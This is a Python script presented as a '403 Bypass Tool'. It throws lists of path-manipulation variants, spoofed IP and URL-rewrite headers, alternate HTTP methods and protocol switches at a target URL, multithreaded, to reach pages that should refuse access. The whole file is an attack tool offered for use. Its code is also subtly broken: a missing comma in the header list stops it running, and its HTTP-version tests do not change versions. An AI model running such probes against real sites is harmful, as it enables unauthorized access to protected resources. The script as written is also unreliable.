#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
from concurrent.futures import ThreadPoolExecutor

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def random_user_agent():
    return ''.join(random.choices(string.ascii_uppercase, k=7))

# Path Manipulation Techniques
PATH_MANIPULATION_TECHNIQUES = [
    "{0}", "%2e/{0}", "%2f{0}/", "%2f{0}%2f", "./{0}/",
    "{0}/.", "/{0}/./", "/{0}//", "./{0}/./",
    "{0}?", "{0}.html", "{0}.php", "{0}#",
    "{0}..;/", "{0};/", "//{0}///", 
    "{0}/ ".upper(), "*{0}/", "/{0}", "/{0}//",
    "{0}../", "{0}/*", ";/{0}/", "/;//{0}/",
    "{0}%00", "{0}/{0}.txt", "{0}."
]

# Header Bypass Techniques
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": ""},
    {"X-Rewrite-URL": ""},
    {"X-Rewrite-URL": "{path}/login"}
    {"Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
]

HTTP_METHODS = ["GET", "POST", "PUT", "HEAD", "PATCH", "TRACE"]

def load_wordlist(wordlist_file):
    try:
        with open(wordlist_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
        sys.exit(1)

def test_protocol_switch(url, path=None, verbose=False):
    try:
        base_url = url.rstrip('/')
        full_url = f"{base_url}/{path}" if path else base_url
        
        if full_url.startswith('https://'):
            new_url = full_url.replace('https://', 'http://')
            proto = "HTTP"
        else:
            new_url = full_url.replace('http://', 'https://')
            proto = "HTTPS"
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing protocol switch to {proto}{colors.END}")
        
        response = requests.get(
            new_url,
            headers={"User-Agent": random_user_agent()},
            timeout=5,
            allow_redirects=True
        )
        
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            return True, response.status_code, "GET", None, path if path else "", new_url
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return False, 0, None, None, None, None

def test_http_versions(url, path=None, verbose=False):
    try:
        base_url = url.rstrip('/')
        full_url = f"{base_url}/{path}" if path else base_url
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing HTTP/1.0{colors.END}")
        
        response = requests.get(
            full_url,
            headers={
                "User-Agent": random_user_agent(),
                "Connection": "close"
            },
            timeout=5,
            allow_redirects=True
        )
        
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            return True, response.status_code, "GET", {"HTTP-Version": "1.0"}, path if path else ""
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing HTTP/2{colors.END}")
        
        response = requests.get(
            full_url,
            headers={"User-Agent": random_user_agent()},
            timeout=5,
            allow_redirects=True
        )
        
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            http_version = "2" if hasattr(response.raw, 'version') and response.raw.version == 11 else "1.1"
            return True, response.status_code, "GET", {"HTTP-Version": http_version}, path if path else ""
            
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return False, 0, None, None, None

def test_fuzzing(url, path, method="GET", verbose=False):
    try:
        effective_path = f"/{path}" if path else "/"
        full_url = url + effective_path
        
        headers = {"User-Agent": random_user_agent()}
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing: {method} {full_url}{colors.END}")
        
        response = requests.request(
            method, 
            full_url, 
            headers=headers, 
            timeout=5,
            allow_redirects=True
        )
        
        if verbose:
            print(f"{colors.YELLOW}    Response: {response.status_code}{colors.END}")
        
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            return True, response.status_code, method, headers, effective_path
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return False, 0, None, None, None

def test_headers(url, path, headers, verbose=False):
    try:
        effective_path = f"/{path}" if path else "/"
        full_url = url + effective_path
        
        final_headers = headers.copy()
        
        # Process headers that might contain {path} placeholder
        for header_name in final_headers:
            if isinstance(final_headers[header_name], str) and '{path}' in final_headers[header_name]:
                final_headers[header_name] = final_headers[header_name].format(path=path if path else '')
        
        # Special handling for X-Original-URL and X-Rewrite-URL
        if "X-Original-URL" in final_headers and not final_headers["X-Original-URL"]:
            final_headers["X-Original-URL"] = effective_path.lstrip('/')
        if "X-Rewrite-URL" in final_headers and not final_headers["X-Rewrite-URL"]:
            final_headers["X-Rewrite-URL"] = effective_path.lstrip('/')
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing HEADERS: GET {full_url}", end='')
            print(f" with headers: {final_headers}", end='')
            print(colors.END)
        
        response = requests.get(
            full_url, 
            headers=final_headers, 
            timeout=5,
            allow_redirects=True
        )
        
        if verbose:
            print(f"{colors.YELLOW}    Response: {response.status_code}{colors.END}")
        
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            return True, response.status_code, "GET", final_headers, effective_path
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return False, 0, None, None, None

def print_success(url, status_code, method, headers, path):
    print(f"\n{colors.GREEN}[+] Bypass found!{colors.END}")
    print(f"URL: {url}{path}")
    print(f"Method: {colors.BOLD}{method}{colors.END}")
    print(f"Status: {colors.BOLD}{status_code}{colors.END}")
    if headers:
        print("Headers:")
        for k, v in headers.items():
            if v:  
                print(f"  {k}: {v}")
    print("-" * 50)

def run_tests(target_url, path, threads=20, verbose=False):
    effective_path = path if path is not None else ""
    
    # Test protocol switch (HTTP/HTTPS)
    success, code, method, headers, path, new_url = test_protocol_switch(target_url, effective_path, verbose)
    if success:
        print_success(new_url, code, method, headers, "")

    # Test HTTP versions
    success, code, method, headers, path = test_http_versions(target_url, effective_path, verbose)
    if success:
        print_success(target_url, code, method, headers, f"/{path}" if path else "")
    
    # Test HTTP Methods
    if verbose:
        print(f"\n{colors.BOLD}[*] Testing HTTP Methods{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for method in HTTP_METHODS:
            futures.append(executor.submit(test_fuzzing, target_url, effective_path, method, verbose))
        
        for future in futures:
            try:
                success, code, method, headers, path = future.result()
                if success:
                    print_success(target_url, code, method, headers, path)
            except Exception as e:
                if verbose:
                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")

    # Test Header Bypass Techniques
    if verbose:
        print(f"\n{colors.BOLD}[*] Testing Header Bypass Techniques{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for header in BYPASS_HEADERS:
            h = header.copy()
            futures.append(executor.submit(test_headers, target_url, effective_path, h, verbose))
        
        for future in futures:
            try:
                success, code, _, headers, path = future.result()
                if success:
                    print_success(target_url, code, "GET", headers, path)
            except Exception as e:
                if verbose:
                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")

    # Test Path Manipulation Techniques
    if effective_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Testing Path Manipulation Techniques{colors.END}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for technique in PATH_MANIPULATION_TECHNIQUES:
                try:
                    if technique == "{0}/ ".upper():
                        modified_path = technique.format(effective_path.upper())
                    else:
                        modified_path = technique.format(effective_path)
                    if verbose:
                        print(f"{colors.BLUE}[*] Testing path: {modified_path}{colors.END}")
                    futures.append(executor.submit(test_fuzzing, target_url, modified_path, "GET", verbose))
                except (IndexError, KeyError) as e:
                    if verbose:
                        print(f"{colors.RED}    Error applying technique {technique}: {e}{colors.END}")
                    continue
            
            for future in futures:
                try:
                    success, code, _, _, path = future.result()
                    if success:
                        print_success(target_url, code, "GET", None, path)
                except Exception as e:
                    if verbose:
                        print(f"{colors.RED}    Error processing result: {e}{colors.END}")

def main():
    parser = argparse.ArgumentParser(description='403 Bypass Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('paths', nargs='?', default=None, help='Paths to test (comma-separated, default: root path)')
    parser.add_argument('-w', '--wordlist', help='Wordlist file containing paths to test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
    
    target_url = args.url.rstrip('/')
    
    if args.wordlist:
        paths = load_wordlist(args.wordlist)
        if args.verbose:
            print(f"{colors.BLUE}[*] Testing {len(paths)} paths from wordlist{colors.END}")
        
        for path in paths:
            if args.verbose:
                print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
            run_tests(target_url, path, args.threads, args.verbose)
    else:
        if args.paths:
            paths = [p.strip() for p in args.paths.split(',')]
            for path in paths:
                if args.verbose:
                    print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
                run_tests(target_url, path, args.threads, args.verbose)
        else:
            run_tests(target_url, None, args.threads, args.verbose)

if __name__ == "__main__":
    main()
